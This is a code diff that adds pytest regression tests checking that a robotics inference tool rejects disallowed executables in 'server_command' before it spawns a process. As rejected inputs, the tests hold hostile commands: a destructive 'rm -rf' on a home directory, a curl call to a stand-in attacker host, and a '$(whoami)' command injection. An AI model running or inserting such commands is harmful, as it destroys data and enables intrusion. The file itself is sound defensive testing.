@@ -101,3 +101,135 @@ class TestToolDispatch:
     def test_bad_data_config_returns_error_dict(self):
         res = qwen_vla_inference(action="status", data_config="nope")
         assert res["status"] == "error"
+
+
+class TestServerCommandExecutableAllowlist:
+    """PR #92 LLM-input-safety baseline: argv[0] from ``server_command`` must
+    be matched against ``validate_executable`` before ``subprocess.Popen``.
+
+    Pinned regression test - fails on pre-fix code where the start path
+    invoked ``subprocess.Popen`` with whatever executable the caller passed.
+    """
+
+    def test_disallowed_executable_rejected_before_subprocess(self, monkeypatch):
+        # Sentinel: if Popen is reached we have a security regression.
+        called = {"popen": False}
+
+        def fake_popen(*args, **kwargs):  # pragma: no cover - guard
+            called["popen"] = True
+            raise AssertionError("subprocess.Popen must not be reached for a disallowed executable")
+
+        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", fake_popen)
+        # Make _is_service_running return False so we proceed into _start_service.
+        monkeypatch.setattr(
+            "strands_robots.tools.qwen_vla_inference._is_service_running",
+            lambda host, port: False,
+        )
+
+        res = qwen_vla_inference(
+            action="start",
+            data_config="so100",
+            model_path="models/qwen",
+            port=5599,
+            server_command="rm -rf /home/ubuntu",
+        )
+        assert res["status"] == "error"
+        assert "server_command[0]" in res["message"]
+        assert "allowlist" in res["message"]
+        assert called["popen"] is False
+
+    def test_disallowed_absolute_path_rejected(self, monkeypatch):
+        called = {"popen": False}
+
+        def fake_popen(*args, **kwargs):  # pragma: no cover
+            called["popen"] = True
+            raise AssertionError("subprocess.Popen must not be reached for /usr/bin/curl")
+
+        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", fake_popen)
+        monkeypatch.setattr(
+            "strands_robots.tools.qwen_vla_inference._is_service_running",
+            lambda host, port: False,
+        )
+
+        res = qwen_vla_inference(
+            action="start",
+            data_config="so100",
+            model_path="models/qwen",
+            port=5599,
+            server_command="/usr/bin/curl http://evil.example/x",
+        )
+        assert res["status"] == "error"
+        assert "server_command[0]" in res["message"]
+        assert called["popen"] is False
+
+    def test_shell_metacharacter_in_argv0_rejected(self, monkeypatch):
+        called = {"popen": False}
+
+        def fake_popen(*args, **kwargs):  # pragma: no cover
+            called["popen"] = True
+            raise AssertionError("Popen reached with shell-metacharacter argv[0]")
+
+        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", fake_popen)
+        monkeypatch.setattr(
+            "strands_robots.tools.qwen_vla_inference._is_service_running",
+            lambda host, port: False,
+        )
+
+        res = qwen_vla_inference(
+            action="start",
+            data_config="so100",
+            model_path="models/qwen",
+            port=5599,
+            # shlex.split keeps these characters as part of the first token,
+            # so the path-character allowlist must reject them.
+            server_command="python$(whoami)",
+        )
+        assert res["status"] == "error"
+        assert called["popen"] is False
+
+    @pytest.mark.parametrize(
+        "good_cmd",
+        [
+            "python -m qwen_vla.serve",
+            "python3 -m qwen_vla.serve",
+            "python3.12 -m qwen_vla.serve",
+            "uv run -m qwen_vla.serve",
+            "/usr/bin/python3 -m qwen_vla.serve",
+            "/opt/venv/bin/python3.12 -m qwen_vla.serve",
+        ],
+    )
+    def test_documented_entrypoints_pass_validation(self, monkeypatch, good_cmd):
+        # We only assert validation passes (Popen is mocked to a no-op so
+        # the test does not actually spawn a process). The call still falls
+        # through to the connect-loop and times out, which is fine - the
+        # invariant we pin is that argv[0] validation does not reject these
+        # documented launchers.
+        popen_calls = []
+
+        class FakePopen:
+            def __init__(self, argv, **kwargs):
+                popen_calls.append(argv)
+
+        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.subprocess.Popen", FakePopen)
+        monkeypatch.setattr(
+            "strands_robots.tools.qwen_vla_inference._is_service_running",
+            lambda host, port: False,
+        )
+        # Short-circuit the connect loop.
+        monkeypatch.setattr("strands_robots.tools.qwen_vla_inference.time.sleep", lambda _: None)
+        monkeypatch.setattr(
+            "strands_robots.tools.qwen_vla_inference.time.time",
+            iter([0.0, 0.1, 1000.0]).__next__,
+        )
+
+        res = qwen_vla_inference(
+            action="start",
+            data_config="so100",
+            model_path="models/qwen",
+            port=5599,
+            server_command=good_cmd,
+        )
+        # Validation passed (Popen was reached); we do not assert on the
+        # eventual error since we forced _is_service_running=False to skip
+        # the real network probe.
+        assert popen_calls, f"validate_executable wrongly rejected documented entrypoint {good_cmd!r}: {res}"
